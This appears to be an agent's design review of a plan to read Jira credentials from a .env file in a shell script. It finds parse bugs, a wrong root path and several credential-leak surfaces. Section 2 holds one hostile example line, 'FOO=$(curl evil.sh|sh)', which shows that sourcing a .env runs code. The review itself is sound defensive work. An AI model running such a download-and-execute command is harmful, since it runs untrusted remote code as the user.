# Juror: credential-handling

Position: amend

Lens: where can the value leak, and is the parse safe on a real `.env`?

The premise holds and the feature should exist. Three of the plan's factual
claims are wrong or incomplete, the parse it prescribes fails on the very
fixture its own `Done when` demands, and it names one leak surface while three
others already exist on this estate. All are fixable inside the slice.

---

## 1. Is the problem real, and stated correctly?

**Real, and the refusal is where the plan says it is.** Re-derived:

```
$ sed -n '1702,1706p' skills/plot/scripts/plot-host.sh
  if [ -z "${JIRA_EMAIL:-}" ] || [ -z "${JIRA_API_TOKEN:-}" ]; then
    echo "plot-host: Jira needs JIRA_EMAIL and JIRA_API_TOKEN in the environment — an unauthenticated Jira must not read as an empty inbox" >&2
    echo "  Create a token at https://id.atlassian.com/manage-profile/security/api-tokens" >&2
    echo "  then export JIRA_EMAIL=<your account email> and JIRA_API_TOKEN=<the token>." >&2
    exit 3
```

The plan cites `plot-host.sh:1703`; the guard opens at `:1702`. Immaterial.

**"Nothing on the estate reads a `.env` file" — confirmed.**

```
$ grep -rn '\.env\b' skills/plot/scripts/ --include='*.sh'
```
Every hit is `process.env.PLOT_*` inside an embedded node heredoc, or
`.plot-worker.envelope.json`. **Zero file reads.** The claim is true.

**"`.env` is not in this repository's `.gitignore`" — confirmed, and it is
worse than stated.** The plan checked the file; I checked what git actually
does, in both a root checkout and a dispatch worktree:

```
$ git check-ignore -v .env ; echo "exit=$?"
exit=1
$ git -C .worktrees/free-1390039f check-ignore -v .env ; echo "exit=$?"
exit=1
```

Exit 1 = not ignored, in both. A `git add -A` in either carries a credentials
file. The worktree matters because `plot-dispatch.sh` cuts desks under
`.worktrees/`, agents run `git add -A` there, and MEMORY.md already records
that exact accident for `.plot-worker.log`.

**"The environment wins" is the right default** and matches every other
precedence rule here.

---

## 2. Right fix, or a symptom fix?

**Right fix, right layer, right blast radius.** `plot-host.sh` is the one place
that speaks to Jira (`curl --user`, `:1720`), so the read belongs beside the
guard that refuses. Two named variables on one path is the correct boundary —
see Q5 for the one place that boundary is reached from and the plan has not
checked.

**Refusing `set -a; . ./.env` is correct and under-argued.** The plan's reason
is a zsh abort and unrelated imports. The stronger reason is that sourcing
**executes** the file: `FOO=$(curl evil.sh|sh)` in a `.env` runs as the board's
user. A targeted read is not merely tidier, it is the difference between
reading data and executing an untrusted file. Say so — an implementer who only
reads "it aborted in zsh" may decide their shell is fine and source it.

**But the prescribed parse is not the safe read it claims.** See Q4.

---

## 3. Is there a gate that plumbing-through cannot satisfy?

**Yes — two, and they are the plan's strongest feature.**

- *"both variables set in the environment produce behaviour byte-identical to
  today, pinned by asserting no file read occurs"* — a value plumbed through
  and ignored still opens the file. Only not-reading passes.
- *"the token's value appears in no output stream, pinned by asserting its
  absence from both stdout and stderr"* — a negative assertion over the actual
  streams; passing it requires the value genuinely not be printed.

The `.gitignore` gate is objective. The source-naming gate is pinned by text.

**The absence gate is scoped too narrowly to hold.** It covers stdout and
stderr of one script. Q5 names three surfaces outside those two streams that
the gate, as written, would pass while the value escapes.

---

## 4. Claims I could not verify, or found false

**FALSE — the prescribed parse fails the plan's own `Done when` fixture.**
The plan mandates a fixture holding *"unquoted JSON, quotes, `export ` prefixes
and blank lines"*, then prescribes:

```bash
grep -m1 '^JIRA_EMAIL=' "$root/.env" | cut -d= -f2-
```

Measured against a `.env` containing exactly what the plan asks for:

```
$ cat .env
# comment line
JIRA_EMAIL=me@acme.test<3 trailing spaces>
export JIRA_API_TOKEN="tok with spaces"
OTHER={"a":1,"b":"x=y"}
JIRA_API_TOKEN_OLD=decoy

$ grep -m1 '^JIRA_EMAIL=' .env | cut -d= -f2-
me@acme.test          <- 3 trailing spaces retained, len=15 not 12
$ grep -m1 '^JIRA_API_TOKEN=' .env | cut -d= -f2-
                      <- EMPTY
```

Four defects, each reproduced:

| input | plan's parse yields | correct |
|---|---|---|
| `export JIRA_API_TOKEN=…` | **nothing** — `^JIRA_API_TOKEN=` never matches | the token |
| `JIRA_EMAIL=me@acme.test   ` | `me@acme.test␠␠␠` (len 15) | `me@acme.test` |
| `JIRA_API_TOKEN="abc123"` | `"abc123"` — quotes in the credential | `abc123` |
| `JIRA_API_TOKEN=abc123 # prod` | `abc123 # prod` | `abc123` |

`cut -d= -f2-` does handle `a=b=c` correctly (`[a=b=c]`), and `-m1` correctly
skips `#JIRA_API_TOKEN=old`. `JIRA_API_TOKEN_OLD` is correctly not matched by
`^JIRA_API_TOKEN=` — the anchor plus `=` saves it.

**The `export` case is the serious one.** It is the single most common way a
`.env` is written, the plan's `Done when` explicitly requires it in the
fixture, and the failure is **silent**: an empty value flows into
`--user "${JIRA_EMAIL}:"`, which produces a 401 and the operator debugs a
credential that was in the file all along. That is the reported defect, with a
new mask on.

The trailing-space and quote cases fail the same way — a 401 from a value the
file holds correctly.

**FALSE — `$root` does not exist in `plot-host.sh`.** The plan writes
`"$root/.env"` as if a root variable were in scope. It is not:

```
$ grep -n 'toplevel\|SCRIPT_DIR\|BASH_SOURCE\|repo_root' skills/plot/scripts/plot-host.sh
340:here="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
```

`here` is the **script's** directory (`skills/plot/scripts/`), not the
repository root, and there is no `git rev-parse --show-toplevel` anywhere in
the file. An implementer copying the snippet either invents a resolution or
uses `here`, which points at the wrong directory. The plan says "the repository
root, resolved the way every other script resolves it" — **this script does not
resolve it at all.** Name the expression.

**This matters more in a worktree than the plan realises.** A dispatch desk is
a separate checkout at `.worktrees/<branch>/`:

```
$ cat .worktrees/free-1390039f/.git
gitdir: /Users/jwloka/Quatico/Agentic-Tools/plot/.git/worktrees/free-1390039f
```

`git rev-parse --show-toplevel` from inside that desk answers the **worktree**
root, which has **no `.env`** — the operator's credentials sit in the main
checkout. So a worker's Jira call refuses while the same command from the main
checkout succeeds, and nothing says why. The plan must state which root it
means for a worktree, and the "no upward search" rule makes that choice binding
rather than incidental.

**UNVERIFIABLE (fine):** the 200 from `/rest/api/3/myself` on the reporter's
machine. Nothing to re-derive here.

**Immaterial:** `:1703` vs `:1702`.

---

## 5. What my lens notices that the plan missed

**(a) The value already leaks into a ledger on disk, today, and the gate would
not see it.** `plot-host.sh:1742`:

```bash
budget_record_jira() {
  budget_append jira "${JIRA_EMAIL:-unknown}" api 1 - - - unknown
}
```

`budget_append` writes to `$HOME/.plot/state/budget.tsv` (`plot-budget.sh:59-66`).
So `JIRA_EMAIL` is persisted, unredacted, in a machine-local TSV. The email is
half of a Basic credential — `curl --user "$JIRA_EMAIL:$JIRA_API_TOKEN"` — and
an attacker holding it needs only the token.

Why this belongs to **this** plan: today that file is written only when an
operator has already exported the variable deliberately. After this change,
Plot **picks the value up by itself** from a file and writes it to a second
location the operator never named. The plan's gate asserts absence from stdout
and stderr; `budget.tsv` is neither, so the gate passes while the credential
half lands on disk. Either redact the account for the jira connector, or state
in the plan that this ledger is a known, accepted sink — but do not let a
"value appears in no output stream" gate imply coverage it does not have.

**(b) The refusal's stderr is published over HTTP by the board.**
`fleet.ts:2246-2259`:

```ts
const said = await scriptsFor(opts).hostSaid(['issue-list', …]);
if (said.answer === 'failed') {
  entry.issueError = said.said;   // ← the script's stderr
```

`issueError` is a `/api/board` payload field (`fleet.ts:7067`). So anything
`plot-host.sh` writes to stderr on the Jira path reaches an HTTP response and
whatever reads it. The current message is safe. The plan's new message —
`read from .env` — is also safe. The risk is **structural**: the plan's own
argument is *"a log line added later is exactly how such a value escapes"*, and
it is right, but it only defends stdout/stderr of the script. It should record
that stderr on this path is **published**, so a future implementer adding
`plot-host: read JIRA_API_TOKEN=… from .env` is not merely writing to a
terminal — they are putting it in an API response. MEMORY.md already records
`prError` keeping raw host text with a browser test enforcing it; the same
pipe is live for `issueError`.

**(c) `set -x` — clean today, and worth a sentence.** Verified:

```
$ grep -rn 'set -x\|xtrace\|PS4' skills/plot/scripts/ scripts/
(no output)
```

No tracing anywhere, and no `PLOT_DEBUG` switch in `plot-host.sh`. Argv is also
clean: the comment at `:1717` notes `--user` does the base64 and *"the token
never appears in argv of any child process here"* — correct, `curl --user` puts
it in this process's own argv, which `ps` on a multi-user box can read, but
that is pre-existing and unchanged. **The point for this plan:** once the value
comes from a file rather than an operator's deliberate export, an
`env | grep JIRA` or an `xtrace` added while debugging turns a repo file into
console output. "No `set -x` on this path" is cheap to state and cheap to keep.

**(d) The worktree `.env` question is unasked.** Covered in Q4 — a desk has no
`.env`, and `.gitignore` is a tracked file so the fix reaches a desk only after
that desk rebases. Both are consequences of adding the entry; neither is
mentioned.

**(e) The refusal path is reached from more than one caller, and the plan did
not check.** `jira_require_config` guards `issue-list`, `issue-view` and
`issue-status`. The board polls `issue-list` on the PR timer; `issue-view`
fires per click; `issue-status` is Plot's **one tracker write**. All three hit
the same refusal. Two named variables is still the right boundary — but the
plan asserts it without naming the three ops that reach it, and `issue-status`
being a write means a silently-empty parse (Q4's `export` case) turns a
credential that exists into a failed write, not just a blank inbox.

---

## Amendments

1. **Fix the parse.** Accept an optional `export ` prefix, strip surrounding
   quotes, strip trailing whitespace. Decide explicitly whether a trailing
   `# comment` is stripped, and say which — a token legitimately containing `#`
   makes this a choice, not an oversight. Still no `eval`, still no sourcing.
   The current snippet returns **empty** on the plan's own mandated fixture.
2. **Name the root expression**, and say what it resolves to inside a dispatch
   worktree — the desk has no `.env` and the "no upward search" rule makes that
   a refusal rather than a fallback.
3. **Widen the absence gate beyond stdout/stderr**, or state its limits.
   `budget.tsv` holds `JIRA_EMAIL` unredacted today; the gate as written passes
   that. Redact it, or record it as accepted.
4. **Record that this stderr is published** via `issueError` into `/api/board`,
   so the "no log line later" rule is enforced where it actually matters.
5. **Add "no `set -x` / no debug echo on this path"** to the gates — verified
   clean today, and free to keep that way.
6. **Strengthen the anti-sourcing argument** from "it aborted in zsh" to
   "sourcing executes the file".
7. **Name the three ops** (`issue-list`, `issue-view`, `issue-status`) the
   refusal is reached from, and confirm two variables is the boundary for the
   write as well as the reads.

Every item is inside the declared slice. None reopens the design. The feature
is correct; the mechanism as written silently yields an empty credential on the
commonest `.env` line shape, which reproduces the reported symptom.

Position: amend
